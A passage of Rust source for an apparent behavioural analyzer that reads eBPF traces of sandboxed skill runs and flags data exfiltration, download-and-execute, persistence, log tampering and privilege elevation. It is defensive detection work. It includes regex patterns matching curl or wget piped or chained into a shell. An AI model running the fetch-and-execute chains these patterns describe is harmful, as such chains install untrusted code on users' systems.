use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::path::{Path, PathBuf};

use anyhow::Result;
use regex::Regex;
use serde_json::Value;
use url::Url;

use crate::config::{normalize_domain, DiscoveryConfig, Policy};
use crate::model::{
    stable_id, Analysis, AssessmentRecord, EventKind, FindingRecord, NormalizedEvent,
    PlatformEvidenceRecord, PlatformRecord, RunRecord, RunRecordExt, SCHEMA_VERSION,
};
use crate::tracee::{flatten_strings, read_trace};

const RULE_CONFIDENTIALITY: &str = "confidentiality.sensitive_to_untrusted_network";
const RULE_OUTSIDE_WRITE: &str = "integrity.skill_write_outside_allowlist";
const RULE_DOWNLOAD_EXECUTE: &str = "integrity.untrusted_download_execute";
const RULE_CURL_PIPE_SHELL: &str = "behavior.observed_curl_pipe_shell";
const RULE_SENSITIVE_FILE_MODIFICATION: &str = "integrity.local_sensitive_file_modified";
const RULE_AUTH_MATERIAL_MODIFICATION: &str = "integrity.authentication_material_modified";
const RULE_SCHEDULED_PERSISTENCE: &str = "integrity.scheduled_task_persistence";
const RULE_DANGEROUS_SCHEDULED_ACTION: &str = "behavior.scheduled_high_risk_network_action";
const RULE_SECURITY_UPDATE_TAMPER: &str = "integrity.security_update_process_tampered";
const RULE_PROCESS_INJECTION: &str = "behavior.process_injection_or_memory_execution";
const RULE_STARTUP_PERSISTENCE: &str = "integrity.boot_service_startup_persistence";
const RULE_FORENSIC_TAMPER: &str = "integrity.logging_or_forensic_artifact_tampered";
const RULE_PRIVILEGE_ELEVATION: &str = "behavior.privilege_or_integrity_elevation";
const RULE_SECURITY_POLICY_TAMPER: &str = "integrity.security_policy_modified";
const RULE_PROTECTION_TAMPER: &str = "integrity.built_in_protection_disabled";
const MAX_FINDINGS_PER_RUN: usize = 1_024;
const MAX_PLATFORM_EVIDENCE_PER_RUN: usize = 2_048;
const MAX_RETAINED_URL_BYTES: usize = 2_048;

pub struct Analyzer {
    policy: Policy,
    discovery: DiscoveryConfig,
    known_domains: BTreeMap<String, String>,
    supported_platform_ids: BTreeSet<String>,
    url_regex: Regex,
    marker_regex: Regex,
    curl_pipe_shell: Regex,
    download_then_execute: Regex,
}

#[derive(Clone, Debug, Default)]
struct Taint {
    skill: bool,
    sensitive: BTreeSet<String>,
    untrusted: BTreeSet<String>,
}

impl Taint {
    fn merge(&mut self, other: &Self) {
        self.skill |= other.skill;
        self.sensitive.extend(other.sensitive.iter().cloned());
        self.untrusted.extend(other.untrusted.iter().cloned());
    }
}

#[derive(Clone, Debug, Default)]
struct ProcessState {
    taint: Taint,
    fds: HashMap<i64, Vec<String>>,
}

#[derive(Clone, Debug)]
struct ChainObservation {
    seq: u64,
    timestamp: Option<u64>,
    urls: Vec<(String, String)>,
}

struct RunState<'a> {
    analyzer: &'a Analyzer,
    run: &'a RunRecord,
    processes: HashMap<i64, ProcessState>,
    files: HashMap<String, Taint>,
    findings: BTreeMap<String, FindingRecord>,
    platform_evidence: BTreeMap<String, PlatformEvidenceRecord>,
    platform_candidates: BTreeMap<String, PlatformRecord>,
    unknown_platforms: BTreeSet<String>,
    recent_downloads: HashMap<i64, ChainObservation>,
    recent_shells: HashMap<i64, ChainObservation>,
    output_truncated: bool,
}

impl Analyzer {
    pub fn new(
        policy: Policy,
        discovery: DiscoveryConfig,
        platforms: &[PlatformRecord],
    ) -> Result<Self> {
        let marker_base = policy.marker_prefix.trim_end_matches(['_', '-']);
        let marker_pattern = format!(r"(?i){}[_-]?[a-z0-9_-]+", regex::escape(marker_base));
        let known_domains = platforms
            .iter()
            .filter_map(|platform| {
                let domain = normalize_domain(&platform.canonical_domain);
                (!domain.is_empty()).then(|| (domain, platform.platform_id.clone()))
            })
            .collect();
        let supported_platform_ids = platforms
            .iter()
            .filter(|platform| platform.status == "supported")
            .map(|platform| platform.platform_id.clone())
            .collect();
        Ok(Self {
            policy,
            discovery,
            known_domains,
            supported_platform_ids,
            // `flatten_strings` removes JSON container punctuation, so `]` is
            // retained here to support bracketed IPv6 URL literals.
            url_regex: Regex::new(r#"(?i)https?://[^\s'\"<>|)}]+"#)?,
            marker_regex: Regex::new(&marker_pattern)?,
            curl_pipe_shell: Regex::new(
                r"(?i)\b(?:curl|wget)\b[^\r\n]*\|\s*(?:/[a-z0-9_./-]+/)?(?:bash|sh|zsh|dash)\b",
            )?,
            download_then_execute: Regex::new(
                r"(?i)\b(?:curl|wget)\b[^\r\n]*(?:&&|;)\s*(?:bash|sh|zsh|dash|python3?|\./|/[a-z0-9_.-]+/)",
            )?,
        })
    }

    pub fn analyze_run(&self, run: &RunRecord, runs_csv: &Path) -> Result<Analysis> {
        if run.is_untraced() && run.telemetry_path.is_none() {
            return Ok(self.empty_analysis(run, "no_ebpf"));
        }
        let telemetry_path = resolve_telemetry_path(run.telemetry_path.as_deref(), runs_csv);
        let trace = match read_trace(&telemetry_path) {
            Ok(trace) => trace,
            Err(_) => return Ok(self.empty_analysis(run, "unavailable")),
        };
        let event_count = trace
            .events
            .iter()
            .filter(|event| !event.pre_detonation)
            .count();
        let malformed_lines = trace.malformed_lines;
        let mut state = RunState {
            analyzer: self,
            run,
            processes: HashMap::new(),
            files: HashMap::new(),
            findings: BTreeMap::new(),
            platform_evidence: BTreeMap::new(),
            platform_candidates: BTreeMap::new(),
            unknown_platforms: BTreeSet::new(),
            recent_downloads: HashMap::new(),
            recent_shells: HashMap::new(),
            output_truncated: false,
        };
        for event in trace.events.iter().filter(|event| !event.pre_detonation) {
            state.observe(event);
        }
        Ok(state.finish(
            event_count,
            malformed_lines,
            run.is_failed() || run.is_untraced(),
        ))
    }

    fn empty_analysis(&self, run: &RunRecord, coverage: &str) -> Analysis {
        Analysis {
            assessment: assessment(run, &self.policy, &self.discovery.version, &[], coverage, 0),
            findings: Vec::new(),
            platform_evidence: Vec::new(),
            platform_candidates: Vec::new(),
        }
    }

    fn urls(&self, evidence: &str) -> Vec<(String, String)> {
        let mut urls = self
            .url_regex
            .find_iter(evidence)
            .filter_map(|matched| {
                let raw = matched
                    .as_str()
                    .trim_end_matches(|character: char| ".,;:".contains(character));
                let parsed = Url::parse(raw).ok()?;
                let domain = parsed.host_str().map(normalize_domain)?;
                let retained = if raw.len() <= MAX_RETAINED_URL_BYTES {
                    raw.to_string()
                } else {
                    format!("{}://{domain}/<url-truncated>", parsed.scheme())
                };
                Some((retained, domain))
            })
            .collect::<Vec<_>>();
        urls.sort();
        urls.dedup();
        urls
    }

    fn marker(&self, evidence: &str) -> Option<String> {
        self.marker_regex
            .find(evidence)
            .map(|matched| matched.as_str().to_ascii_lowercase())
    }

    fn known_platform(&self, domain: &str) -> Option<&str> {
        self.known_domains
            .iter()
            .filter(|(known, _)| domain == *known || domain.ends_with(&format!(".{known}")))
            .max_by_key(|(known, _)| known.len())
            .map(|(_, platform_id)| platform_id.as_str())
    }

    fn is_supported_platform(&self, platform_id: &str) -> bool {
        self.supported_platform_ids.contains(platform_id)
    }
}

impl RunState<'_> {
    fn observe(&mut self, event: &NormalizedEvent) {
        // Tracee reports failed syscalls with a negative return value. Treating
        // those as successful reads, writes, execs, or connects fabricates
        // provenance and can turn a blocked attempt into a false data-flow.
        if event.return_value.is_some_and(|value| value < 0) {
            self.inherit_process(event);
            self.observe_compromise_rules(event);
            match event.kind {
                // The sandbox intentionally blocks egress and many host writes.
                // A tainted attempted sink is still security evidence, but a
                // failed call must not create successful fd/inode provenance.
                EventKind::Network | EventKind::Dns => self.observe_network(event),
                EventKind::Write => {
                    if let Some(path) = event_path(event) {
                        self.check_outside_write(event, &path);
                    }
                }
                EventKind::Open if open_writes(event) => {
                    if let Some(path) = event_path(event) {
                        self.check_outside_write(event, &path);
                    }
                }
                _ => {}
            }
            return;
        }
        self.inherit_process(event);
        if let Some(marker) = self.analyzer.marker(&event.evidence) {
            self.process_mut(event.pid).taint.sensitive.insert(marker);
        }
        self.observe_compromise_rules(event);

        match event.kind {
            EventKind::Process => self.observe_process(event),
            EventKind::Fd => self.observe_fd(event),
            EventKind::Open => self.observe_open(event),
            EventKind::Read => self.observe_read(event),
            EventKind::Write => self.observe_write(event),
            EventKind::Exec => self.observe_exec(event),
            EventKind::Network | EventKind::Dns => self.observe_network(event),
            EventKind::Other => {}
        }
    }

    fn inherit_process(&mut self, event: &NormalizedEvent) {
        if self.processes.contains_key(&event.pid) {
            return;
        }
        let inherited = event
            .ppid
            .and_then(|parent| self.processes.get(&parent).cloned())
            .unwrap_or_default();
        self.processes.insert(event.pid, inherited);
    }

    fn observe_process(&mut self, event: &NormalizedEvent) {
        // `processId` is the container/namespace PID in Tracee JSON. Match it
        // with namespace child fields; `child_pid` itself is the host PID.
        let child = arg_i64(
            event,
            &[
                "child_ns_pid",
                "child_ns_tid",
                "child_pid",
                "child_tid",
                "child",
                "pid",
            ],
        )
        .or_else(|| event.return_value.filter(|value| *value > 0));
        if let Some(child) = child {
            let parent = self.processes.get(&event.pid).cloned().unwrap_or_default();
            self.processes.entry(child).or_insert(parent);
        }
    }

    fn observe_fd(&mut self, event: &NormalizedEvent) {
        match event.name.to_ascii_lowercase().as_str() {
            "pipe" | "pipe2" => {
                let descriptors = arg_i64s(event, &["pipefd", "pipe_fds", "fds"]);
                if descriptors.len() < 2 {
                    return;
                }
                let key = format!("pipe:{}:{}", event.pid, event.seq);
                let process = self.process_mut(event.pid);
                process.fds.insert(descriptors[0], vec![key.clone()]);
                process.fds.insert(descriptors[1], vec![key]);
            }
            "dup" | "dup2" | "dup3" => {
                let old_fd = arg_i64(event, &["oldfd", "old_fd", "fildes", "fd"]);
                let new_fd = if event.name.eq_ignore_ascii_case("dup") {
                    event.return_value.filter(|fd| *fd >= 0)
                } else {
                    arg_i64(event, &["newfd", "new_fd"])
                        .or_else(|| event.return_value.filter(|fd| *fd >= 0))
                };
                if let (Some(old_fd), Some(new_fd)) = (old_fd, new_fd) {
                    let keys = self
                        .process(event.pid)
                        .fds
                        .get(&old_fd)
                        .cloned()
                        .unwrap_or_default();
                    self.process_mut(event.pid).fds.insert(new_fd, keys);
                }
            }
            "close" => {
                if let Some(fd) = arg_i64(event, &["fd", "fildes"]) {
                    self.process_mut(event.pid).fds.remove(&fd);
                }
            }
            _ => {}
        }
    }

    fn observe_open(&mut self, event: &NormalizedEvent) {
        let path = event_path(event);
        let keys = self.file_keys(event, path.as_deref());
        let writes = open_writes(event);
        if let Some(path) = path.as_deref() {
            if !writes {
                self.taint_process_for_source(event.pid, path);
                self.mark_source_file(&keys, path);
            }
            if writes {
                self.check_outside_write(event, path);
                let taint = self.process(event.pid).taint.clone();
                self.merge_file_taint(&keys, &taint);
            } else {
                self.merge_files_into_process(event.pid, &keys);
            }
        }
        if let Some(fd) = event.return_value.filter(|value| *value >= 0) {
            self.process_mut(event.pid).fds.insert(fd, keys);
        }
    }

    fn observe_read(&mut self, event: &NormalizedEvent) {
        let path = event_path(event);
        let keys = self.file_keys(event, path.as_deref());
        if let Some(path) = path.as_deref() {
            self.taint_process_for_source(event.pid, path);
            self.mark_source_file(&keys, path);
        }
        self.merge_files_into_process(event.pid, &keys);
    }

    fn observe_write(&mut self, event: &NormalizedEvent) {
        let path = event_path(event);
        let keys = self.file_keys(event, path.as_deref());
        let renamed_taint = if event.name.eq_ignore_ascii_case("rename")
            || event.name.eq_ignore_ascii_case("renameat")
            || event.name.eq_ignore_ascii_case("renameat2")
        {
            arg_string(event, &["oldpath", "old_path", "oldname"])
                .filter(|path| path.starts_with('/'))
                .map(|path| self.combined_file_taint(&[path_key(&path)]))
        } else {
            None
        };
        if let Some(path) = path.as_deref() {
            self.check_outside_write(event, path);
        }
        let mut taint = self.process(event.pid).taint.clone();
        if let Some(renamed_taint) = renamed_taint {
            taint.merge(&renamed_taint);
        }
        self.merge_file_taint(&keys, &taint);
    }

    fn observe_exec(&mut self, event: &NormalizedEvent) {
        let path = event_path(event);
        let keys = self.file_keys(event, path.as_deref());
        self.merge_files_into_process(event.pid, &keys);
        if path.as_deref().is_some_and(is_skill_path) {
            self.process_mut(event.pid).taint.skill = true;
        }

        let file_taint = self.combined_file_taint(&keys);
        if self.analyzer.policy.flag_untrusted_download_exec && !file_taint.untrusted.is_empty() {
            let sink = path.clone().unwrap_or_else(|| event.evidence.clone());
            let source = file_taint
                .untrusted
                .iter()
                .next()
                .cloned()
                .unwrap_or_default();
            self.add_finding(
                event,
                RULE_DOWNLOAD_EXECUTE,
                "integrity",
                "critical",
                &source,
                "process",
                &sink,
                "Executed content obtained from an untrusted network source",
            );
        }

        let evidence = event.evidence.clone();
        let urls = self.analyzer.urls(&evidence);
        let is_network_command = command_uses_network_tool(&evidence);
        let curl_pipe = self.analyzer.curl_pipe_shell.is_match(&evidence);
        let download_execute = curl_pipe
            || self.analyzer.download_then_execute.is_match(&evidence)
            || command_downloads_and_executes_same_path(&evidence);
        let correlated_urls = (!download_execute)
            .then(|| self.correlate_download_and_shell(event, &urls, is_network_command))
            .flatten();

        if curl_pipe {
            let sink = urls
                .first()
                .map(|(url, _)| url.as_str())
                .unwrap_or(evidence.as_str());
            self.add_finding(
                event,
                RULE_CURL_PIPE_SHELL,
                "behavioral",
                "high",
                "untrusted-network",
                "command",
                sink,
                "Observed a network downloader piped directly into a shell",
            );
        }
        if download_execute && self.analyzer.policy.flag_untrusted_download_exec {
            let sink = urls
                .first()
                .map(|(url, _)| url.as_str())
                .unwrap_or(evidence.as_str());
            self.add_finding(
                event,
                RULE_DOWNLOAD_EXECUTE,
                "integrity",
                "critical",
                "untrusted-network",
                "process",
                sink,
                "Downloaded and executed content in one command chain",
            );
        }
        if let Some(chain_urls) = correlated_urls {
            let sink = chain_urls
                .first()
                .map(|(url, _)| url.as_str())
                .unwrap_or(evidence.as_str());
            if self.analyzer.policy.flag_untrusted_download_exec {
                self.add_finding(
                    event,
                    RULE_DOWNLOAD_EXECUTE,
                    "integrity",
                    "critical",
                    "untrusted-network",
                    "process",
                    sink,
                    "Correlated downloader and shell execution in one process lineage",
                );
            }
            self.observe_platform_urls(event, &chain_urls, true);
        }

        if is_network_command {
            self.observe_sinks(event, &urls, true);
            self.observe_platform_urls(event, &urls, curl_pipe || download_execute);
            if let Some((output, url)) = download_output_path(&evidence, &urls) {
                let taint = Taint {
                    untrusted: BTreeSet::from([url]),
                    ..Taint::default()
                };
                self.merge_file_taint(&[path_key(&output)], &taint);
            }
            if let Some((_, domain)) = urls.first() {
                self.process_mut(event.pid)
                    .taint
                    .untrusted
                    .insert(domain.clone());
            }
        }
    }

    fn correlate_download_and_shell(
        &mut self,
        event: &NormalizedEvent,
        urls: &[(String, String)],
        is_network_command: bool,
    ) -> Option<Vec<(String, String)>> {
        let group = event.ppid.unwrap_or(event.pid);
        let current = ChainObservation {
            seq: event.seq,
            timestamp: event.timestamp,
            urls: urls.to_vec(),
        };
        if is_network_command && !urls.is_empty() {
            let counterpart = self
                .recent_shells
                .get(&group)
                .filter(|shell| chain_observations_close(shell, &current))
                .cloned();
            self.recent_downloads.insert(group, current);
            return counterpart.map(|_| urls.to_vec());
        }
        if is_shell_exec(event) {
            let counterpart = self
                .recent_downloads
                .get(&group)
                .filter(|download| chain_observations_close(download, &current))
                .cloned();
            self.recent_shells.insert(group, current);
            return counterpart.map(|download| download.urls);
        }
        None
    }

    fn observe_network(&mut self, event: &NormalizedEvent) {
        let urls = self.analyzer.urls(&event.evidence);
        let url_domains = urls
            .iter()
            .map(|(_, domain)| domain.as_str())
            .collect::<BTreeSet<_>>();
        self.observe_sinks(event, &urls, false);
        self.observe_platform_urls(event, &urls, false);

        let domains = event_domains(event, &urls);
        for domain in &domains {
            if is_local_or_lan_host(domain) {
                continue;
            }
            if self
                .analyzer
                .discovery
                .ignored_domains
                .iter()
                .any(|ignored| domain == ignored || domain.ends_with(&format!(".{ignored}")))
            {
                continue;
            }
            if let Some(platform_id) = self.analyzer.known_platform(domain).map(str::to_owned) {
                if !self.analyzer.is_supported_platform(&platform_id) {
                    self.mark_unknown_platform(&platform_id);
                }
                self.add_platform_evidence(
                    event,
                    Some(&platform_id),
                    domain,
                    "",
                    if event.kind == EventKind::Dns {
                        "known_platform_dns"
                    } else {
                        "known_platform_domain"
                    },
                    0.8,
                );
            } else if event.kind == EventKind::Dns {
                self.add_platform_evidence(event, None, domain, "", "observed_dns", 0.1);
            } else {
                self.add_platform_evidence(event, None, domain, "", "observed_network_domain", 0.1);
            }
        }
        if self.analyzer.policy.require_source_to_sink
            && self.process(event.pid).taint.sensitive.is_empty()
        {
            return;
        }
        for domain in domains {
            if is_local_or_lan_host(&domain) {
                continue;
            }
            if url_domains.contains(domain.as_str()) {
                continue;
            }
            if !self.analyzer.policy.is_trusted_domain(&domain) {
                let source = self.source_marker(event);
                self.add_finding(
                    event,
                    RULE_CONFIDENTIALITY,
                    "confidentiality",
                    "critical",
                    &source,
                    if event.kind == EventKind::Dns {
                        "dns"
                    } else {
                        "network"
                    },
                    &domain,
                    if event.return_value.is_some_and(|value| value < 0) {
                        "Sensitive source was directed at a blocked untrusted network endpoint"
                    } else {
                        "Sensitive marker or source reached an untrusted network endpoint"
                    },
                );
            }
        }
    }

    fn observe_sinks(
        &mut self,
        event: &NormalizedEvent,
        urls: &[(String, String)],
        require_network_command: bool,
    ) {
        if require_network_command && !command_uses_network_tool(&event.evidence) {
            return;
        }
        if self.analyzer.policy.require_source_to_sink
            && self.process(event.pid).taint.sensitive.is_empty()
        {
            return;
        }
        for (url, domain) in urls {
            if is_local_or_lan_host(domain) {
                continue;
            }
            if !self.analyzer.policy.is_trusted_domain(domain) {
                let source = self.source_marker(event);
                self.add_finding(
                    event,
                    RULE_CONFIDENTIALITY,
                    "confidentiality",
                    "critical",
                    &source,
                    "network",
                    url,
                    if event.return_value.is_some_and(|value| value < 0) {
                        "Sensitive source was directed at a blocked untrusted network endpoint"
                    } else {
                        "Sensitive marker or source reached an untrusted network endpoint"
                    },
                );
            }
        }
    }

    fn observe_platform_urls(
        &mut self,
        event: &NormalizedEvent,
        urls: &[(String, String)],
        command_chain: bool,
    ) {
        for (url, domain) in urls {
            if is_local_or_lan_host(domain) {
                continue;
            }
            if let Some(platform_id) = self.analyzer.known_platform(domain).map(str::to_owned) {
                if !self.analyzer.is_supported_platform(&platform_id) {
                    self.mark_unknown_platform(&platform_id);
                }
                self.add_platform_evidence(
                    event,
                    Some(&platform_id),
                    domain,
                    url,
                    "known_platform_url",
                    1.0,
                );
                continue;
            }
            if self
                .analyzer
                .discovery
                .ignored_domains
                .iter()
                .any(|ignored| domain == ignored || domain.ends_with(&format!(".{ignored}")))
            {
                continue;
            }

            let lower_url = url.to_ascii_lowercase();
            let lower_evidence = event.evidence.to_ascii_lowercase();
            let path_indicator = self
                .analyzer
                .discovery
                .path_indicators
                .iter()
                .any(|indicator| lower_url.contains(&indicator.to_ascii_lowercase()));
            let domain_indicator = self
                .analyzer
                .discovery
                .domain_indicators
                .iter()
                .any(|indicator| domain.contains(&indicator.to_ascii_lowercase()));
            let command_indicator = self
                .analyzer
                .discovery
                .command_indicators
                .iter()
                .any(|indicator| lower_evidence.contains(&indicator.to_ascii_lowercase()));
            let confidence = ((command_chain as u8 as f64) * 0.45
                + (path_indicator as u8 as f64) * 0.30
                + (domain_indicator as u8 as f64) * 0.30
                + (command_indicator as u8 as f64) * 0.15)
                .min(1.0);

            if !command_chain
                || !(path_indicator || domain_indicator || command_indicator)
                || confidence + f64::EPSILON < self.analyzer.discovery.threshold
                || !candidate_dns_hostname(domain)
            {
                self.add_platform_evidence(event, None, domain, url, "observed_url", confidence);
                continue;
            }

            // Runtime egress alone is not evidence of a skill-sharing service.
            // Require an install/execute chain plus URL, path, domain, or command semantics.
            let platform_id = stable_id("platform", &[domain]).replace(":v1:", "-v1-");
            self.mark_unknown_platform(&platform_id);
            self.add_platform_evidence(
                event,
                Some(&platform_id),
                domain,
                url,
                "candidate_command_chain_url",
                confidence,
            );
            let seen_at = self.run.evidence_time();
            self.platform_candidates
                .entry(platform_id.clone())
                .and_modify(|current| {
                    let observation =
                        candidate_platform(&platform_id, domain, url, confidence, &seen_at);
                    merge_candidate_observation(current, &observation);
                })
                .or_insert_with(|| {
                    candidate_platform(&platform_id, domain, url, confidence, &seen_at)
                });
        }
    }

    fn add_platform_evidence(
        &mut self,
        event: &NormalizedEvent,
        platform_id: Option<&str>,
        domain: &str,
        url: &str,
        kind: &str,
        confidence: f64,
    ) {
        let domain = if domain.is_empty() {
            String::new()
        } else {
            csv_safe_evidence(domain, 253)
        };
        let url = if url.is_empty() {
            String::new()
        } else {
            // URLs reaching this seam have already passed `Url::parse` and are
            // capped by `Analyzer::urls`; normalization is therefore normally
            // byte-for-byte while still neutralizing hostile CSV text.
            csv_safe_evidence(url, 4_096)
        };
        let evidence_id = stable_id(
            "evidence",
            &[
                &self.run.run_id,
                platform_id.unwrap_or_default(),
                &domain,
                &url,
                kind,
            ],
        );
        let seen_at = self.run.evidence_time();
        if let Some(existing) = self.platform_evidence.get_mut(&evidence_id) {
            existing.confidence = existing.confidence.max(confidence);
            if existing.last_seen_at < seen_at {
                existing.last_seen_at = seen_at;
            }
            existing.event_seq = existing.event_seq.min(event.seq);
            return;
        }
        if self.platform_evidence.len() >= MAX_PLATFORM_EVIDENCE_PER_RUN {
            self.output_truncated = true;
            return;
        }
        self.platform_evidence.insert(
            evidence_id.clone(),
            PlatformEvidenceRecord {
                schema_version: SCHEMA_VERSION,
                evidence_id,
                platform_id: platform_id.map(ToOwned::to_owned),
                run_id: self.run.run_id.clone(),
                skill_id: self.run.skill_id.clone(),
                domain,
                url,
                evidence_kind: kind.to_string(),
                event_seq: event.seq,
                confidence,
                first_seen_at: seen_at.clone(),
                last_seen_at: seen_at,
            },
        );
    }

    fn mark_unknown_platform(&mut self, platform_id: &str) {
        if self.unknown_platforms.contains(platform_id) {
            return;
        }
        if self.unknown_platforms.len() >= MAX_PLATFORM_EVIDENCE_PER_RUN {
            self.output_truncated = true;
            return;
        }
        self.unknown_platforms.insert(platform_id.to_owned());
    }

    fn taint_process_for_source(&mut self, pid: i64, path: &str) {
        if self.analyzer.policy.is_sensitive_path(path) {
            self.process_mut(pid)
                .taint
                .sensitive
                .insert(path.to_string());
        }
        if is_skill_path(path) {
            self.process_mut(pid).taint.skill = true;
        }
    }

    fn mark_source_file(&mut self, keys: &[String], path: &str) {
        let mut source = Taint {
            skill: is_skill_path(path),
            ..Taint::default()
        };
        if self.analyzer.policy.is_sensitive_path(path) {
            source.sensitive.insert(path.to_string());
        }
        self.merge_file_taint(keys, &source);
    }

    fn check_outside_write(&mut self, event: &NormalizedEvent, path: &str) {
        if self.analyzer.policy.flag_persistence_writes
            && self.process(event.pid).taint.skill
            && !self.analyzer.policy.is_allowed_write(path)
        {
            self.add_finding(
                event,
                RULE_OUTSIDE_WRITE,
                "integrity",
                "high",
                "skill",
                "file",
                path,
                if event.return_value.is_some_and(|value| value < 0) {
                    "Skill-tainted process attempted a blocked write outside configured allowed roots"
                } else {
                    "Skill-tainted process wrote outside configured allowed roots"
                },
            );
        }
    }

    fn observe_compromise_rules(&mut self, event: &NormalizedEvent) {
        let path = event_path(event);
        let mutates_path = matches!(event.kind, EventKind::Write)
            || (event.kind == EventKind::Open && open_writes(event));
        let evidence = event.evidence.to_ascii_lowercase();

        if mutates_path {
            if let Some(path) = path.as_deref() {
                if is_auth_material_path(path) {
                    self.add_rule_finding(
                        event,
                        RULE_AUTH_MATERIAL_MODIFICATION,
                        "critical",
                        "auth-material",
                        path,
                        "Authentication or authorization material was modified",
                    );
                } else if is_sensitive_configuration_path(path) {
                    self.add_rule_finding(
                        event,
                        RULE_SENSITIVE_FILE_MODIFICATION,
                        "high",
                        "sensitive-file",
                        path,
                        "A local sensitive configuration or key file was modified",
                    );
                }

                if is_scheduled_task_path(path) {
                    self.add_rule_finding(
                        event,
                        RULE_SCHEDULED_PERSISTENCE,
                        "high",
                        "scheduled-task",
                        path,
                        "A scheduled task or recurring job definition was modified",
                    );
                    if is_dangerous_network_action(&evidence) {
                        self.add_rule_finding(
                        event,
                        RULE_DANGEROUS_SCHEDULED_ACTION,
                        "critical",
                        "scheduled-task",
                        path,
                        "A recurring task references a tunneling service or high-risk network action",
                    );
                    }
                }
                if is_startup_path(path) {
                    self.add_rule_finding(
                        event,
                        RULE_STARTUP_PERSISTENCE,
                        "high",
                        "startup-config",
                        path,
                        "Boot, service, or startup configuration was modified",
                    );
                }
                if is_log_or_forensic_path(path) {
                    self.add_rule_finding(
                        event,
                        RULE_FORENSIC_TAMPER,
                        "high",
                        "forensic-artifact",
                        path,
                        "Logging, auditing, shell history, or forensic state was modified",
                    );
                }
                if is_security_policy_path(path) {
                    self.add_rule_finding(
                        event,
                        RULE_SECURITY_POLICY_TAMPER,
                        "critical",
                        "security-policy",
                        path,
                        "A host security-policy or enforcement configuration was modified",
                    );
                }
                if is_update_or_protection_path(path) {
                    self.add_rule_finding(
                        event,
                        RULE_PROTECTION_TAMPER,
                        "critical",
                        "security-protection",
                        path,
                        "Built-in protection or security-update configuration was modified",
                    );
                }
            }
        }

        if event.kind == EventKind::Exec {
            if is_scheduled_task_command(&evidence) {
                self.add_rule_finding(
                    event,
                    RULE_SCHEDULED_PERSISTENCE,
                    "high",
                    "command",
                    &event.evidence,
                    "A command changed scheduled or recurring execution",
                );
                if is_dangerous_network_action(&evidence) {
                    self.add_rule_finding(
                        event,
                        RULE_DANGEROUS_SCHEDULED_ACTION,
                        "critical",
                        "command",
                        &event.evidence,
                        "A recurring task references a tunneling service or high-risk network action",
                    );
                }
            }
            if is_update_tamper_command(&evidence) {
                self.add_rule_finding(
                    event,
                    RULE_SECURITY_UPDATE_TAMPER,
                    "critical",
                    "command",
                    &event.evidence,
                    "A command attempted to hinder security updates or endpoint protection",
                );
            }
            if is_startup_command(&evidence) {
                self.add_rule_finding(
                    event,
                    RULE_STARTUP_PERSISTENCE,
                    "high",
                    "command",
                    &event.evidence,
                    "A command established boot, service, or startup persistence",
                );
            }
            if is_forensic_tamper_command(&evidence) {
                self.add_rule_finding(
                    event,
                    RULE_FORENSIC_TAMPER,
                    "high",
                    "command",
                    &event.evidence,
                    "A command cleared or disabled logging, auditing, or forensic artifacts",
                );
            }
            if is_privilege_elevation_command(&evidence) {
                self.add_rule_finding(
                    event,
                    RULE_PRIVILEGE_ELEVATION,
                    "high",
                    "command",
                    &event.evidence,
                    "A command attempted privilege or integrity-level elevation",
                );
            }
            if is_security_policy_command(&evidence) {
                self.add_rule_finding(
                    event,
                    RULE_SECURITY_POLICY_TAMPER,
                    "critical",
                    "command",
                    &event.evidence,
                    "A command modified firewall or mandatory-access-control enforcement",
                );
            }
        }

        if is_process_injection_event(event, &evidence) {
            self.add_rule_finding(
                event,
                RULE_PROCESS_INJECTION,
                "critical",
                "process-memory",
                path.as_deref().unwrap_or(&event.evidence),
                "Observed process injection, executable anonymous memory, or memory-resident execution",
            );
        }
        if is_privilege_elevation_event(event, &evidence) {
            self.add_rule_finding(
                event,
                RULE_PRIVILEGE_ELEVATION,
                "high",
                "process",
                path.as_deref().unwrap_or(&event.evidence),
                "Observed a privilege or integrity-level elevation primitive",
            );
        }
    }

    fn add_rule_finding(
        &mut self,
        event: &NormalizedEvent,
        rule_id: &str,
        severity: &str,
        sink_kind: &str,
        sink_value: &str,
        summary: &str,
    ) {
        let category = if rule_id.starts_with("behavior.") {
            "behavioral"
        } else {
            "integrity"
        };
        self.add_finding(
            event, rule_id, category, severity, "skill", sink_kind, sink_value, summary,
        );
    }

    fn source_marker(&self, event: &NormalizedEvent) -> String {
        self.analyzer
            .marker(&event.evidence)
            .or_else(|| {
                self.process(event.pid)
                    .taint
                    .sensitive
                    .iter()
                    .next()
                    .cloned()
            })
            .unwrap_or_else(|| "sensitive-source".to_string())
    }

    #[allow(clippy::too_many_arguments)]
    fn add_finding(
        &mut self,
        event: &NormalizedEvent,
        rule_id: &str,
        category: &str,
        severity: &str,
        source: &str,
        sink_kind: &str,
        sink_value: &str,
        summary: &str,
    ) {
        let source_marker = (!source.is_empty()).then(|| csv_safe_evidence(source, 2048));
        let sink_value = csv_safe_evidence(sink_value, 2048);
        let finding_id = stable_id(
            "finding",
            &[
                &self.run.run_id,
                rule_id,
                source_marker.as_deref().unwrap_or_default(),
                sink_kind,
                &sink_value,
            ],
        );
        if let Some(existing) = self.findings.get_mut(&finding_id) {
            existing.evidence_seq_start = existing.evidence_seq_start.min(event.seq);
            existing.evidence_seq_end = existing.evidence_seq_end.max(event.seq);
            return;
        }
        if self.findings.len() >= MAX_FINDINGS_PER_RUN {
            self.output_truncated = true;
            return;
        }
        self.findings.insert(
            finding_id.clone(),
            FindingRecord {
                schema_version: SCHEMA_VERSION,
                finding_id,
                run_id: self.run.run_id.clone(),
                rule_id: rule_id.to_string(),
                category: category.to_string(),
                severity: severity.to_string(),
                source_marker,
                sink_kind: sink_kind.to_string(),
                sink_value,
                evidence_seq_start: event.seq,
                evidence_seq_end: event.seq,
                summary: summary.to_string(),
            },
        );
    }

    fn process(&self, pid: i64) -> &ProcessState {
        self.processes
            .get(&pid)
            .expect("process is initialized before event dispatch")
    }

    fn process_mut(&mut self, pid: i64) -> &mut ProcessState {
        self.processes.entry(pid).or_default()
    }

    fn file_keys(&self, event: &NormalizedEvent, path: Option<&str>) -> Vec<String> {
        let mut keys = Vec::new();
        if let Some(path) = path {
            keys.push(path_key(path));
        }
        if let Some(inode) = arg_string(event, &["inode", "ino", "inode_nr", "inode_number"]) {
            let device = arg_string(event, &["dev", "device", "device_id"]).unwrap_or_default();
            keys.push(format!("inode:{device}:{inode}"));
        }
        if keys.is_empty() {
            if let Some(fd) = arg_i64(event, &["fd", "file_descriptor", "filedes"]) {
                if let Some(opened) = self.process(event.pid).fds.get(&fd) {
